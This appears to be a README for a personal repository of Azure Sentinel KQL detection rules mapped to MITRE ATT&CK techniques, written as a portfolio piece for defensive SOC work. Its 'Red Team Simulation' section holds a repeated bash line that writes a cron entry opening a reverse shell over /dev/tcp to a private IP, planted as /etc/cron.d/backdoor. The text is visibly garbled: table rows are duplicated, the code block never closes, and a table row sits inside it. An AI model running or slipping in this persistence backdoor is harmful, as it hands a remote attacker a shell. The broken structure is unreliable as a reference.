# Azure Sentinel Detection Engineering Lab

This repository contains KQL detection rules mapped to MITRE ATT&CK framework.

## Detections:
| MITRE ID | Rule Name | File |
| --- | --- | --- |
| T1059.001 | Encoded PowerShell | `KQL-Rules/T1059-Encoded-PowerShell.kql` |
| T1486 | Ransomware Activity | `KQL-Rules/T1486-Ransomware-Detection.kql` |

| T1059.001 | Encoded PowerShell | `KQL-Rules/T1059-Encoded-PowerShell.kql` |
| T1486 | Ransomware Activity | `KQL-Rules/T1486-Ransomware-Detection.kql` |
| T1053.003 | Cron Job Abuse | `detections/T1053-Scheduled-Task/T1053.003-Cron-Abuse.kql` |

### 3. T1053.003 - Cron Job Abuse Detection

**Red Team Simulation:**
```bash
echo "* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" > /etc/cron.d/backdoor
echo "* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" > /etc/cron.d/backdoor
| T1110.001 | RDP Brute Force | `KQL-Rules/T1110-RDP-BruteForce.kql` |

## Skills Demonstrated:
Azure Sentinel, KQL, MITRE ATT&CK, Threat Detection, SOC Operations

**Author: [Muatez Mhgoub Margani] | SC-200 | CEH**
